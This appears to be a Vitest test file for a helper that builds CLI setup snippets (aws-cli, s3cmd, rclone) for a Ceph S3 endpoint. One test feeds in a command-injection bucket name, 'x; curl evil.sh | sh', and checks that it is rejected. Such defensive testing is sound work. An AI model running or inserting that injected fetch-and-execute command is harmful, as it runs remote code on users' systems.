import { describe, test, expect } from "vitest"
import { CLI_TOOLS, endpointParts, getCliSnippets, isCliTool, type CliTool } from "./cliSetupSnippets"

const base = { endpoint: "https://rgw.example.com", region: "eu-de-2" }
const allCode = (tool: CliTool, bucketName?: string) =>
  getCliSnippets(tool, { ...base, bucketName }).steps.map((s) => s.code)

describe("getCliSnippets", () => {
  test("aws-cli without bucket", () => {
    const { steps } = getCliSnippets("aws-cli", base)
    expect(steps.map((s) => s.id)).toEqual(["createProfile", "configureProfile", "listBuckets", "upload", "download"])
    expect(steps.find((s) => s.id === "listBuckets")?.code).toBe(
      "aws s3 ls --profile ceph --endpoint-url https://rgw.example.com"
    )
    const configure = steps.find((s) => s.id === "configureProfile")?.code
    expect(configure).toContain("region eu-de-2")
    expect(configure).toContain("s3.addressing_style path")
  })

  test.each(CLI_TOOLS)("%s with a bucket name lists objects and uses the name", (tool) => {
    const { steps } = getCliSnippets(tool, { ...base, bucketName: "my-bucket" })
    const ids = steps.map((s) => s.id)
    expect(ids).toContain("listObjects")
    expect(ids).not.toContain("listBuckets")
    const code = steps.map((s) => s.code).join("\n")
    expect(code).not.toContain("<bucket-name>")
    for (const id of ["listObjects", "upload", "download"] as const) {
      expect(steps.find((s) => s.id === id)?.code).toContain("my-bucket")
    }
  })

  test.each(CLI_TOOLS)("%s without a bucket name keeps the placeholder", (tool) => {
    const { steps } = getCliSnippets(tool, base)
    expect(steps.find((s) => s.id === "upload")?.code).toContain("<bucket-name>")
    expect(steps.find((s) => s.id === "download")?.code).toContain("<bucket-name>")
  })

  test.each(CLI_TOOLS)("%s ignores unsafe bucket names", (tool) => {
    for (const name of ["x; curl evil.sh | sh", "my bucket"]) {
      const code = allCode(tool, name).join("\n")
      expect(code).not.toContain(name)
      expect(code).toContain("<bucket-name>")
    }
  })

  test.each(CLI_TOOLS)("%s fills in a bucket name allowed by relaxed rules", (tool) => {
    expect(allCode(tool, "My_Bucket.v2").join("\n")).toContain("My_Bucket.v2")
  })

  test("s3cmd derives host and protocol from the endpoint", () => {
    const https = getCliSnippets("s3cmd", { ...base, endpoint: "https://rgw.example.com:8443/prefix" })
    const code = https.steps.find((s) => s.id === "writeConfig")?.code
    expect(code).toContain("host_base = rgw.example.com:8443")
    expect(code).toContain("host_bucket = rgw.example.com:8443")
    expect(code).toContain("use_https = True")
    expect(code).toContain("bucket_location = eu-de-2")

    const http = getCliSnippets("s3cmd", { ...base, endpoint: "http://localhost:8090/ceph" })
    expect(http.steps.find((s) => s.id === "writeConfig")?.code).toContain("use_https = False")
  })

  test("rclone config", () => {
    const code = getCliSnippets("rclone", base).steps.find((s) => s.id === "writeConfig")?.code
    expect(code).toContain("provider = Ceph")
    expect(code).toContain("endpoint = https://rgw.example.com")
    expect(code).toContain("region = eu-de-2")
  })

  test.each(CLI_TOOLS)("%s: copy-ready code with placeholder credentials only", (tool) => {
    const snippets = getCliSnippets(tool, base)
    expect(snippets.prerequisites).toEqual(["installTool", "accessKey"])
    for (const code of allCode(tool)) {
      for (const line of code.split("\n")) expect(line.startsWith("$")).toBe(false)
    }
    const joined = allCode(tool).join("\n")
    for (const m of joined.matchAll(/(?:access_key|secret_key|access_key_id|secret_access_key) = (.*)/g)) {
      expect(["<ACCESS_KEY_ID>", "<SECRET_ACCESS_KEY>"]).toContain(m[1])
    }
  })
})

describe("endpointParts / isCliTool", () => {
  test("endpointParts does not throw on garbage", () => {
    expect(() => endpointParts("not a url/path")).not.toThrow()
  })

  test("isCliTool", () => {
    expect(isCliTool("aws-cli")).toBe(true)
    expect(isCliTool("awscli")).toBe(false)
  })
})
